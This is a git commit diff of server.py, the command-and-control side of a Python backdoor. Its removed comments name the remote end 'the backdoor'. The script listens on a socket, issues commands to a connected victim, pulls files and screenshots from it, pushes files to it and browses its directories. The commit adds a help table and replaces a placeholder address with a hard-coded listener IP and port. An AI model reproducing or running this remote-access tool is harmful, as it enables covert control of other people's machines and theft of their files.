9a7146c3d7762876cd3ef858b77c43eee41ba1e2
Advaid V <143535369+Advaidv121@users.noreply.github.com>
2023-10-15 23:32:17 +0530

    Add files via upload

--- server.py
+++ server.py
@@ -3,11 +3,9 @@ import json
 import tqdm
 import os
 import time
-# to send the command to backdoor
 def send1(datasend):
     jsdata = json.dumps(datasend)
     target.send(jsdata.encode())
-# receive output from the backdoor
 def recv():
     data1 =''
     while True:
@@ -16,7 +14,6 @@ def recv():
             return json.loads(data1)
         except ValueError:
             continue
-# To receive files from the backdoor
 def recvf():
     SEPARATOR = "<SEPARATOR>"
     received = target.recv(4096).decode()
@@ -34,7 +31,8 @@ def recvf():
             f.write(bytes_read)
             progress.update(len(bytes_read))
             size1 += len(bytes_read)
-#send files to the backdoor
+            print(size1, filesize)
+
 def sendf(imgpth1):
 
     imgpth = ''.join(imgpth1)
@@ -56,68 +54,87 @@ def sendf(imgpth1):
             # update the progress bar
             progress.update(len(bytes_read))
         print("transmission done")
-# to specify what each command should do and call in the server
+
 def targcom():
     while True:
         command = input(str(ip)+":")
-        command.strip()
-        if len(command)>1:
-            send1(command)
-            command1 = command.split()
-            match command1[0]:
-                case "scrst":
-                    recvf()
-                    print("transfer complete")
-                case "copy":
-                    recvf()
-                    print("copy complete")
-                case "send":
-                    sendf(command1[1:])
-                case "lsl":
-                    cd1=os.getcwd()
-                    a= os.listdir(cd1)
-                    sender = ""
-                    if a:
-                        for i in a:
-                            if os.path.isdir(i):
-                                sender = sender + i +" -d" +"\n"
-                            else :
-                                sender = sender + i + " -f"+"\n"
-                        print(sender)
-                    else:
-                        print("empty")
-                case "pwdl":
-                    print(os.getcwd())
-                case "cdl":
-                        try:
-                            data=' '.join(command1[1:])
-                            if "\\" in data:
-                                os.chdir(data)
-                                print("changed to "+os.getcwd())
-                            elif data == "..":
-                                data1=os.getcwd()
-                                for i in range(len(data1)):
-                                    if data1[i] == "\\":
-                                        last=i
-                                os.chdir(data1[:last])
-                                print("changed to "+os.getcwd())
-                    
-                            else:
-                                os.chdir(os.getcwd()+"\\"+data)
-                                print("changed to "+os.getcwd())
-                        except FileNotFoundError:
-                            send1("file not found")
-                
-                case _:
-                    result = recv()
-                    if "Bye ...." in result:
-                        sock.close()
-                        exit(0)
+        if command == "help":
+            table = """
+                    | Command                | Description                                                     |
+                    |------------------------|-----------------------------------------------------------------|
+                    | `ls`                   | List the files and directories in the current directory.        |
+                    | `cd <foldername>`      | Change the current directory to the specified folder.           |
+                    | `cd ..`                | Navigate to the parent directory.                               |
+                    | `pwd`                  | Print the current working directory.                            |
+                    | `cat`                  | Display the contents of a text file.                            |
+                    | `python1 <filename>`   | Execute a Python 1.x script with the specified filename.        |
+                    | `python3 <filename>`   | Execute a Python 3.x script with the specified filename.        |
+                    | `copy <filename>`      | Copy a file from the client to the server.                      |
+                    | `bye`                  | Disconnect from the server.                                     |
+                    | `scrst`                | Command description not provided.                               |
+                    | `send <filename>`      | Send a file to the server.                                      |
+                    | `help`                 | Display a list of available commands.                           |
+                    """
+            print(table)
         else:
-            print("Invalid command")
-#Code to establish and listen for incoming connection
+            command.strip()
+            if len(command)>1:
+                send1(command)
+                command1 = command.split()
+                match command1[0]:
+                    case "scrst":
+                        recvf()
+                        print("transfer complete")
+                    case "copy":
+                        recvf()
+                        print("copy complete")
+                    case "send":
+                        sendf(command1[1:])
+                    case "lsl":
+                        cd1=os.getcwd()
+                        a= os.listdir(cd1)
+                        sender = ""
+                        if a:
+                            for i in a:
+                                if os.path.isdir(i):
+                                    sender = sender + i +" -d" +"\n"
+                                else :
+                                    sender = sender + i + " -f"+"\n"
+                            print(sender)
+                        else:
+                            print("empty")
+                    case "pwdl":
+                        print(os.getcwd())
+                    case "cdl":
+                            try:
+                                data=' '.join(command1[1:])
+                                if "\\" in data:
+                                    os.chdir(data)
+                                    print("changed to "+os.getcwd())
+                                elif data == "..":
+                                    data1=os.getcwd()
+                                    for i in range(len(data1)):
+                                        if data1[i] == "\\":
+                                            last=i
+                                    os.chdir(data1[:last])
+                                    print("changed to "+os.getcwd())
+                        
+                                else:
+                                    os.chdir(os.getcwd()+"\\"+data)
+                                    print("changed to "+os.getcwd())
+                            except FileNotFoundError:
+                                send1("file not found")
+                    
+                    case _:
+                        result = recv()
+                        print(result)
+                        if "Bye ...." in result:
+                            sock.close()
+                            exit(0)
+            else:
+                print("Invalid command")
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-sock.bind(('xx.xxx.xx.xx',xxxx)) # replace the xx.xxx.xx.xx with the ipaddress to connect and xxxx with the port number
+sock.bind(('68.183.89.11',5555))
 print("Listening for connections")
 sock.listen(5)
 target , ip=sock.accept()
